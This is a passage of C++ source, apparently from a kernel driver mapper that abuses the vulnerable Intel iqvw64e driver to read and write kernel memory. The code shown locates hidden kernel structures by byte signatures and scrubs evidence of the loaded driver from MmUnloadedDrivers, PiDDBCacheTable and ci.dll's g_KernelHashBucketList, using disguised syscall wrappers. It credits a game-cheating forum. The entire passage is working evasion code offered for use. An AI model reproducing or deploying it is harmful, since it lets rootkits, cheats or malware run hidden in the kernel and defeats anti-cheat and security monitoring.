	PIMAGE_EXPORT_DIRECTORY export_data = nullptr;
	SIZE_T export_data_size = export_base_size;
	auto status = shadowsyscall<NTSTATUS>("NtAllocateVirtualMemory", NtCurrentProcess, reinterpret_cast<void**>(&export_data), 0, &export_data_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (!NT_SUCCESS(status) || !export_data)
		return 0;

	if (!ReadMemory(device_handle, kernel_module_base + export_base, export_data, export_base_size))
	{
		SIZE_T free_size = 0;
		shadowsyscall<NTSTATUS>("NtFreeVirtualMemory", NtCurrentProcess, reinterpret_cast<void**>(&export_data), &free_size, MEM_RELEASE);
		return 0;
	}

	const auto delta = reinterpret_cast<uint64_t>(export_data) - export_base;
	
	const auto name_table = reinterpret_cast<uint32_t*>(export_data->AddressOfNames + delta);
	const auto ordinal_table = reinterpret_cast<uint16_t*>(export_data->AddressOfNameOrdinals + delta);
	const auto function_table = reinterpret_cast<uint32_t*>(export_data->AddressOfFunctions + delta);

	for (auto i = 0u; i < export_data->NumberOfNames; ++i) {
		const std::string current_function_name = std::string(reinterpret_cast<char*>(name_table[i] + delta));

		if (!stricmp(current_function_name.c_str(), function_name.c_str())) {
			const auto function_ordinal = ordinal_table[i];
			if (function_table[function_ordinal] <= 0x1000) {
				// Wrong function address?
				SIZE_T free_size = 0;
				shadowsyscall<NTSTATUS>("NtFreeVirtualMemory", NtCurrentProcess, reinterpret_cast<void**>(&export_data), &free_size, MEM_RELEASE);
				return 0;
			}
			const auto function_address = kernel_module_base + function_table[function_ordinal];

			if (function_address >= kernel_module_base + export_base && function_address <= kernel_module_base + export_base + export_base_size) {
				SIZE_T free_size = 0;
				shadowsyscall<NTSTATUS>("NtFreeVirtualMemory", NtCurrentProcess, reinterpret_cast<void**>(&export_data), &free_size, MEM_RELEASE);
				return 0;
			}

			SIZE_T free_size = 0;
			shadowsyscall<NTSTATUS>("NtFreeVirtualMemory", NtCurrentProcess, reinterpret_cast<void**>(&export_data), &free_size, MEM_RELEASE);
			return function_address;
		}
	}

	SIZE_T free_size = 0;
	shadowsyscall<NTSTATUS>("NtFreeVirtualMemory", NtCurrentProcess, reinterpret_cast<void**>(&export_data), &free_size, MEM_RELEASE);
	return 0;
}

__forceinline int intel_driver::ClearMmUnloadedDrivers(HANDLE device_handle) {
	ULONG buffer_size = 0;
	void* buffer = nullptr;

	auto status = shadowsyscall<NTSTATUS>("NtQuerySystemInformation",
		static_cast<SYSTEM_INFORMATION_CLASS>(nt::SystemExtendedHandleInformation),
		buffer, buffer_size, &buffer_size
	);

	while (status == nt::STATUS_INFO_LENGTH_MISMATCH) {
		if (buffer) {
			SIZE_T free_size = 0;
			NTSTATUS free_status = shadowsyscall<NTSTATUS>("NtFreeVirtualMemory",NtCurrentProcess, &buffer, &free_size, MEM_RELEASE);
			if (!NT_SUCCESS(free_status)) {
				Log(L"[!] Failed to free memory: " << std::hex << free_status << std::endl);
				return 0;
			}
		}

		// Set buffer to nullptr to let the system choose the address
		buffer = nullptr;
		SIZE_T new_buffer_size = buffer_size;
		status = shadowsyscall<NTSTATUS>("NtAllocateVirtualMemory",
			NtCurrentProcess,
			&buffer,
			0,
			&new_buffer_size,
			MEM_RESERVE | MEM_COMMIT,
			PAGE_READWRITE
		);

		if (!NT_SUCCESS(status)) {
			Log(L"[!] Failed to allocate memory: " << std::hex << status << std::endl);
			return 0;
		}

		status = shadowsyscall<NTSTATUS>("NtQuerySystemInformation",
			static_cast<SYSTEM_INFORMATION_CLASS>(nt::SystemExtendedHandleInformation),
			buffer,
			buffer_size,
			&buffer_size
		);
	}

	if (!NT_SUCCESS(status) || buffer == nullptr) {
		if (buffer != nullptr) {
			SIZE_T free_size = 0;
			shadowsyscall<NTSTATUS>("NtFreeVirtualMemory", NtCurrentProcess, &buffer, &free_size, MEM_RELEASE);
		}
		Log(L"[!] NtQuerySystemInformation failed: " << std::hex << status << std::endl);
		return 0;
	}

	uint64_t object = 0;

	auto system_handle_information = static_cast<nt::PSYSTEM_HANDLE_INFORMATION_EX>(buffer);
	auto current_pid = shadowcall<DWORD>("GetCurrentProcessId");
	for (auto i = 0u; i < system_handle_information->HandleCount; ++i) {
		const nt::SYSTEM_HANDLE current_system_handle = system_handle_information->Handles[i];

		if (current_system_handle.UniqueProcessId != reinterpret_cast<HANDLE>(static_cast<uint64_t>(current_pid))) {
			continue;
		}

		if (current_system_handle.HandleValue == device_handle) {
			object = reinterpret_cast<uint64_t>(current_system_handle.Object);
			break;
		}
	}

	SIZE_T free_size = 0;
	shadowsyscall<NTSTATUS>("NtFreeVirtualMemory", NtCurrentProcess, &buffer, &free_size, MEM_RELEASE);

	if (!object) {
		Log(L"[!] Object not found for handle" << std::endl);
		return 0;
	}

	uint64_t device_object = 0;
	if (!ReadMemory(device_handle, object + 0x8, &device_object, sizeof(device_object)) || !device_object) {
		Log(L"[!] Failed to find device_object" << std::endl);
		return 0;
	}

	uint64_t driver_object = 0;
	if (!ReadMemory(device_handle, device_object + 0x8, &driver_object, sizeof(driver_object)) || !driver_object) {
		Log(L"[!] Failed to find driver_object" << std::endl);
		return 0;
	}

	uint64_t driver_section = 0;
	if (!ReadMemory(device_handle, driver_object + 0x28, &driver_section, sizeof(driver_section)) || !driver_section) {
		Log(L"[!] Failed to find driver_section" << std::endl);
		return 0;
	}

	UNICODE_STRING us_driver_base_dll_name = { 0 };

	if (!ReadMemory(device_handle, driver_section + 0x58, &us_driver_base_dll_name, sizeof(us_driver_base_dll_name)) || us_driver_base_dll_name.Length == 0) {
		Log(L"[!] Failed to find driver name" << std::endl);
		return 0;
	}

	auto unloadedName = std::make_unique<wchar_t[]>((ULONG64)us_driver_base_dll_name.Length / 2ULL + 1ULL);
	if (!ReadMemory(device_handle, (uintptr_t)us_driver_base_dll_name.Buffer, unloadedName.get(), us_driver_base_dll_name.Length)) {
		Log(L"[!] Failed to read driver name" << std::endl);
		return 0;
	}

	us_driver_base_dll_name.Length = 0; // MiRememberUnloadedDriver will check if the length > 0 to save the unloaded driver

	if (!WriteMemory(device_handle, driver_section + 0x58, &us_driver_base_dll_name, sizeof(us_driver_base_dll_name))) {
		Log(L"[!] Failed to write driver name length" << std::endl);
		return 0;
	}

	Log(L"[+] MmUnloadedDrivers Cleaned: " << unloadedName.get() << std::endl);
	return 1;
}



inline PVOID intel_driver::ResolveRelativeAddress(HANDLE device_handle, _In_ PVOID Instruction, _In_ ULONG OffsetOffset, _In_ ULONG InstructionSize) {
	ULONG_PTR Instr = (ULONG_PTR)Instruction;
	LONG RipOffset = 0;
	if (!ReadMemory(device_handle, Instr + OffsetOffset, &RipOffset, sizeof(LONG))) {
		return nullptr;
	}
	PVOID ResolvedAddr = (PVOID)(Instr + InstructionSize + RipOffset);
	return ResolvedAddr;
}

inline bool intel_driver::ExAcquireResourceExclusiveLite(HANDLE device_handle, PVOID Resource, BOOLEAN wait) {
	if (!Resource)
		return 0;

	static uint64_t kernel_ExAcquireResourceExclusiveLite = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, ("ExAcquireResourceExclusiveLite"));

	if (!kernel_ExAcquireResourceExclusiveLite) {
		Log(L"[!] Failed to find ExAcquireResourceExclusiveLite" << std::endl);
		return 0;
	}

	BOOLEAN out;

	return (CallKernelFunction(device_handle, &out, kernel_ExAcquireResourceExclusiveLite, Resource, wait) && out);
}

inline bool intel_driver::ExReleaseResourceLite(HANDLE device_handle, PVOID Resource) {
	if (!Resource)
		return false;

	static uint64_t kernel_ExReleaseResourceLite = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, ("ExReleaseResourceLite"));

	if (!kernel_ExReleaseResourceLite) {
		Log(L"[!] Failed to find ExReleaseResourceLite" << std::endl);
		return false;
	}

	return CallKernelFunction<void>(device_handle, nullptr, kernel_ExReleaseResourceLite, Resource);
}

inline BOOLEAN intel_driver::RtlDeleteElementGenericTableAvl(HANDLE device_handle, PVOID Table, PVOID Buffer) {
	if (!Table)
		return false;

	static uint64_t kernel_RtlDeleteElementGenericTableAvl = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, ("RtlDeleteElementGenericTableAvl"));

	if (!kernel_RtlDeleteElementGenericTableAvl) {
		Log(L"[!] Failed to find RtlDeleteElementGenericTableAvl" << std::endl);
		return false;
	}

	bool out;
	return (CallKernelFunction(device_handle, &out, kernel_RtlDeleteElementGenericTableAvl, Table, Buffer) && out);
}

inline PVOID intel_driver::RtlLookupElementGenericTableAvl(HANDLE device_handle, PRTL_AVL_TABLE Table, PVOID Buffer) {
	if (!Table)
		return nullptr;

	static uint64_t kernel_RtlDeleteElementGenericTableAvl = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, ("RtlLookupElementGenericTableAvl"));

	if (!kernel_RtlDeleteElementGenericTableAvl) {
		Log(L"[!] Failed to find RtlLookupElementGenericTableAvl" << std::endl);
		return nullptr;
	}

	PVOID out;

	if (!CallKernelFunction(device_handle, &out, kernel_RtlDeleteElementGenericTableAvl, Table, Buffer))
		return 0;

	return out;
}


inline intel_driver::PiDDBCacheEntry* intel_driver::LookupEntry(HANDLE device_handle, PRTL_AVL_TABLE PiDDBCacheTable, ULONG timestamp, const wchar_t* name) {

	PiDDBCacheEntry localentry{};
	localentry.TimeDateStamp = timestamp;
	localentry.DriverName.Buffer = (PWSTR)name;
	localentry.DriverName.Length = (USHORT)(wcslen(name) * 2);
	localentry.DriverName.MaximumLength = localentry.DriverName.Length + 2;

	return (PiDDBCacheEntry*)RtlLookupElementGenericTableAvl(device_handle, PiDDBCacheTable, (PVOID)&localentry);
}

inline bool intel_driver::ClearPiDDBCacheTable(HANDLE device_handle) { //PiDDBCacheTable added on LoadDriver

	PRTL_AVL_TABLE PiDDBCacheTable = nullptr;
	PiDDBLockPtr = FindPatternInSectionAtKernel(device_handle, ("PAGE"), intel_driver::ntoskrnlAddr,
		(PUCHAR)("\x8B\xD8\x85\xC0\x0F\x88\x00\x00\x00\x00\x65\x48\x8B\x04\x25\x00\x00\x00\x00\x66\xFF\x88\x00\x00\x00\x00\xB2\x01\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x4C\x8B\x00\x24"),
		("xxxxxx????xxxxx????xxx????xxxxx????x????xx?x"));

	PiDDBCacheTablePtr = FindPatternInSectionAtKernel(device_handle, ("PAGE"), intel_driver::ntoskrnlAddr,
		(PUCHAR)("\x66\x03\xD2\x48\x8D\x0D"), ("xxxxxx"));

	if (PiDDBLockPtr == NULL) {
		// Second attempt for PiDDBLock
		PiDDBLockPtr = FindPatternInSectionAtKernel(device_handle, ("PAGE"), intel_driver::ntoskrnlAddr,
			(PUCHAR)("\x48\x8B\x0D\x00\x00\x00\x00\x48\x85\xC9\x0F\x85\x00\x00\x00\x00\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\xE8"),
			("xxx????xxxxx????xxx????x????x"));

		if (PiDDBLockPtr == NULL) {
			// Third attempt for PiDDBLock (24h2)
			PiDDBLockPtr = FindPatternInSectionAtKernel(device_handle, ("PAGE"), intel_driver::ntoskrnlAddr,
				(PUCHAR)("\x8B\xD8\x85\xC0\x0F\x88\x00\x00\x00\x00\x65\x48\x8B\x04\x25\x00\x00\x00\x00\x48\x8D\x0D\x00\x00\x00\x00\xB2\x01\x66\xFF\x88\x00\x00\x00\x00\x90\xE8\x00\x00\x00\x00\x4C"),
				("xxxxxx????xxxxx????xxx????xxxxx????xx????x"));

			PiDDBCacheTablePtr = FindPatternInSectionAtKernel(device_handle, ("PAGE"), intel_driver::ntoskrnlAddr,
				(PUCHAR)("\x66\x00\x44\x24\x00\x48\x8D\x0D\x00\x00\x00\x00\x66"),
				("x?xx?xxx????x"));
			PiDDBCacheTablePtr += 5;
			PiDDBCacheTable = (PRTL_AVL_TABLE)ResolveRelativeAddress(device_handle, (PVOID)PiDDBCacheTablePtr, 3, 7);
			if (PiDDBLockPtr == NULL) {
				Log(L"[-] Warning PiDDBLock not found" << std::endl);
				return false;
			}

			PiDDBLockPtr += 19; // Third pattern offset for PiDDBLock
			Log(L"[+] PiDDBLock found with third pattern" << std::endl);
		}
		else {
			PiDDBLockPtr += 16; // Second pattern offset for PiDDBLock
			Log(L"[+] PiDDBLock found with second pattern" << std::endl);
		}
	}
	else {
		PiDDBLockPtr += 28; // First pattern offset for PiDDBLock
		Log(L"[+] PiDDBLock found with first pattern" << std::endl);
	}

	if (PiDDBCacheTablePtr == NULL) {
		Log(L"[-] Warning PiDDBCacheTable not found" << std::endl);
		return false;
	}
	Log("[+] PiDDBLock Ptr 0x" << std::hex << PiDDBLockPtr << std::endl);
	Log("[+] PiDDBCacheTable Ptr 0x" << std::hex << PiDDBCacheTablePtr << std::endl);

	PVOID PiDDBLock = ResolveRelativeAddress(device_handle, (PVOID)PiDDBLockPtr, 3, 7);
	if (PiDDBCacheTable == nullptr)
		PiDDBCacheTable = (PRTL_AVL_TABLE)ResolveRelativeAddress(device_handle, (PVOID)PiDDBCacheTablePtr, 6, 10);

	//context part is not used by lookup, lock or delete why we should use it?

	if (!ExAcquireResourceExclusiveLite(device_handle, PiDDBLock, true)) {
		Log(L"[-] Can't lock PiDDBCacheTable" << std::endl);
		return false;
	}
	Log(L"[+] PiDDBLock Locked" << std::endl);

	auto n = GetDriverNameW();

	// search our entry in the table
	PiDDBCacheEntry* pFoundEntry = (PiDDBCacheEntry*)LookupEntry(device_handle, PiDDBCacheTable, iqvw64e_timestamp, n.c_str());
	if (pFoundEntry == nullptr) {
		Log(L"[-] Not found in cache" << std::endl);
		ExReleaseResourceLite(device_handle, PiDDBLock);
		return false;
	}

	// first, unlink from the list
	PLIST_ENTRY prev;
	if (!ReadMemory(device_handle, (uintptr_t)pFoundEntry + (offsetof(struct _PiDDBCacheEntry, List.Blink)), &prev, sizeof(_LIST_ENTRY*))) {
		Log(L"[-] Can't get prev entry" << std::endl);
		ExReleaseResourceLite(device_handle, PiDDBLock);
		return false;
	}
	PLIST_ENTRY next;
	if (!ReadMemory(device_handle, (uintptr_t)pFoundEntry + (offsetof(struct _PiDDBCacheEntry, List.Flink)), &next, sizeof(_LIST_ENTRY*))) {
		Log(L"[-] Can't get next entry" << std::endl);
		ExReleaseResourceLite(device_handle, PiDDBLock);
		return false;
	}

	Log("[+] Found Table Entry = 0x" << std::hex << pFoundEntry << std::endl);

	if (!WriteMemory(device_handle, (uintptr_t)prev + (offsetof(struct _LIST_ENTRY, Flink)), &next, sizeof(_LIST_ENTRY*))) {
		Log(L"[-] Can't set next entry" << std::endl);
		ExReleaseResourceLite(device_handle, PiDDBLock);
		return false;
	}
	if (!WriteMemory(device_handle, (uintptr_t)next + (offsetof(struct _LIST_ENTRY, Blink)), &prev, sizeof(_LIST_ENTRY*))) {
		Log(L"[-] Can't set prev entry" << std::endl);
		ExReleaseResourceLite(device_handle, PiDDBLock);
		return false;
	}

	// then delete the element from the avl table
	if (!RtlDeleteElementGenericTableAvl(device_handle, PiDDBCacheTable, pFoundEntry)) {
		Log(L"[-] Can't delete from PiDDBCacheTable" << std::endl);
		ExReleaseResourceLite(device_handle, PiDDBLock);
		return false;
	}

	//Decrement delete count
	ULONG cacheDeleteCount = 0;
	ReadMemory(device_handle, (uintptr_t)PiDDBCacheTable + (offsetof(struct _RTL_AVL_TABLE, DeleteCount)), &cacheDeleteCount, sizeof(ULONG));
	if (cacheDeleteCount > 0) {
		cacheDeleteCount--;
		WriteMemory(device_handle, (uintptr_t)PiDDBCacheTable + (offsetof(struct _RTL_AVL_TABLE, DeleteCount)), &cacheDeleteCount, sizeof(ULONG));
	}

	// release the ddb resource lock
	ExReleaseResourceLite(device_handle, PiDDBLock);

	Log(L"[+] PiDDBCacheTable Cleaned" << std::endl);

	return true;
}

inline uintptr_t intel_driver::FindPatternAtKernel(HANDLE device_handle, uintptr_t dwAddress, uintptr_t dwLen, BYTE* bMask, const char* szMask) {
	if (!dwAddress) {
		Log(L"[-] No module address to find pattern" << std::endl);
		return 0;
	}

	if (dwLen > 1024 * 1024 * 1024) { //if read is > 1GB
		Log(L"[-] Can't find pattern, Too big section" << std::endl);
		return 0;
	}

	auto sectionData = std::make_unique<BYTE[]>(dwLen);
	if (!ReadMemory(device_handle, dwAddress, sectionData.get(), dwLen)) {
		Log(L"[-] Read failed in FindPatternAtKernel" << std::endl);
		return 0;
	}

	auto result = utils::FindPattern((uintptr_t)sectionData.get(), dwLen, bMask, szMask);

	if (result <= 0) {
		Log(L"[-] Can't find pattern" << std::endl);
		return 0;
	}
	result = dwAddress - (uintptr_t)sectionData.get() + result;
	return result;
}

inline uintptr_t intel_driver::FindSectionAtKernel(HANDLE device_handle, const char* sectionName, uintptr_t modulePtr, PULONG size) {
	if (!modulePtr)
		return 0;
	BYTE headers[0x1000];
	if (!ReadMemory(device_handle, modulePtr, headers, 0x1000)) {
		Log(L"[-] Can't read module headers" << std::endl);
		return 0;
	}
	ULONG sectionSize = 0;
	uintptr_t section = (uintptr_t)utils::FindSection(sectionName, (uintptr_t)headers, &sectionSize);
	if (!section || !sectionSize) {
		Log(L"[-] Can't find section" << std::endl);
		return 0;
	}
	if (size)
		*size = sectionSize;
	return section - (uintptr_t)headers + modulePtr;
}

inline uintptr_t intel_driver::FindPatternInSectionAtKernel(HANDLE device_handle, const char* sectionName, uintptr_t modulePtr, BYTE* bMask, const char* szMask) {
	ULONG sectionSize = 0;
	uintptr_t section = FindSectionAtKernel(device_handle, sectionName, modulePtr, &sectionSize);
	return FindPatternAtKernel(device_handle, section, sectionSize, bMask, szMask);
}

inline bool intel_driver::ClearKernelHashBucketList(HANDLE device_handle) {
	uint64_t ci = utils::GetKernelModuleAddress(("ci.dll"));
	if (!ci) {
		Log(L"[-] Can't Find ci.dll module address" << std::endl);
		return false;
	}

	//Thanks @KDIo3 and @Swiftik from UnknownCheats
	auto sig = FindPatternInSectionAtKernel(device_handle, ("PAGE"), ci, PUCHAR(("\x48\x8B\x1D\x00\x00\x00\x00\xEB\x00\xF7\x43\x40\x00\x20\x00\x00")), ("xxx????x?xxxxxxx"));
	if (!sig) {
		Log(L"[-] Can't Find g_KernelHashBucketList" << std::endl);
		return false;
	}
	auto sig2 = FindPatternAtKernel(device_handle, (uintptr_t)sig - 50, 50, PUCHAR(("\x48\x8D\x0D")), ("xxx"));
	if (!sig2) {
		Log(L"[-] Can't Find g_HashCacheLock" << std::endl);
		return false;
	}
	const auto g_KernelHashBucketList = ResolveRelativeAddress(device_handle, (PVOID)sig, 3, 7);
	const auto g_HashCacheLock = ResolveRelativeAddress(device_handle, (PVOID)sig2, 3, 7);
	if (!g_KernelHashBucketList || !g_HashCacheLock)
	{
		Log(L"[-] Can't Find g_HashCache relative address" << std::endl);
		return false;
	}

	Log(L"[+] g_KernelHashBucketList Found 0x" << std::hex << g_KernelHashBucketList << std::endl);

	if (!ExAcquireResourceExclusiveLite(device_handle, g_HashCacheLock, true)) {
		Log(L"[-] Can't lock g_HashCacheLock" << std::endl);
		return false;
	}
	Log(L"[+] g_HashCacheLock Locked" << std::endl);

	HashBucketEntry* prev = (HashBucketEntry*)g_KernelHashBucketList;
	HashBucketEntry* entry = 0;
	if (!ReadMemory(device_handle, (uintptr_t)prev, &entry, sizeof(entry))) {
		Log(L"[-] Failed to read first g_KernelHashBucketList entry!" << std::endl);
		if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
			Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
		}
		return false;
	}
	if (!entry) {
		Log(L"[!] g_KernelHashBucketList looks empty!" << std::endl);
		if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
			Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
		}
		return true;
	}

	std::wstring wdname = GetDriverNameW();
	std::wstring search_path = GetDriverPath();
	SIZE_T expected_len = (search_path.length() - 2) * 2;

	while (entry) {

		USHORT wsNameLen = 0;
		if (!ReadMemory(device_handle, (uintptr_t)entry + offsetof(HashBucketEntry, DriverName.Length), &wsNameLen, sizeof(wsNameLen)) || wsNameLen == 0) {
			Log(L"[-] Failed to read g_KernelHashBucketList entry text len!" << std::endl);
			if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
				Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
			}
			return false;
		}

		if (expected_len == wsNameLen) {
			wchar_t* wsNamePtr = 0;
			if (!ReadMemory(device_handle, (uintptr_t)entry + offsetof(HashBucketEntry, DriverName.Buffer), &wsNamePtr, sizeof(wsNamePtr)) || !wsNamePtr) {
				Log(L"[-] Failed to read g_KernelHashBucketList entry text ptr!" << std::endl);
				if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
					Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
				}
				return false;
			}

			auto wsName = std::make_unique<wchar_t[]>((ULONG64)wsNameLen / 2ULL + 1ULL);
			if (!ReadMemory(device_handle, (uintptr_t)wsNamePtr, wsName.get(), wsNameLen)) {
				Log(L"[-] Failed to read g_KernelHashBucketList entry text!" << std::endl);
				if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
					Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
				}
				return false;
			}

			size_t find_result = std::wstring(wsName.get()).find(wdname);
			if (find_result != std::wstring::npos) {
				Log(L"[+] Found In g_KernelHashBucketList: " << std::wstring(&wsName[find_result]) << std::endl);
				HashBucketEntry* Next = 0;
				if (!ReadMemory(device_handle, (uintptr_t)entry, &Next, sizeof(Next))) {
					Log(L"[-] Failed to read g_KernelHashBucketList next entry ptr!" << std::endl);
					if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
						Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
					}
					return false;
				}

				if (!WriteMemory(device_handle, (uintptr_t)prev, &Next, sizeof(Next))) {
					Log(L"[-] Failed to write g_KernelHashBucketList prev entry ptr!" << std::endl);
					if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
						Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
					}
					return false;
				}

				if (!FreePool(device_handle, (uintptr_t)entry)) {
					Log(L"[-] Failed to clear g_KernelHashBucketList entry pool!" << std::endl);
					if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
						Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
					}
					return false;
				}
				Log(L"[+] g_KernelHashBucketList Cleaned" << std::endl);
				if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
					Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
					if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
						Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
					}
					return false;
				}
				return true;
			}
		}
		prev = entry;
		//read next
		if (!ReadMemory(device_handle, (uintptr_t)entry, &entry, sizeof(entry))) {
			Log(L"[-] Failed to read g_KernelHashBucketList next entry!" << std::endl);
			if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
				Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
			}
			return false;
		}
	}

	if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
		Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
	}
	return false;
}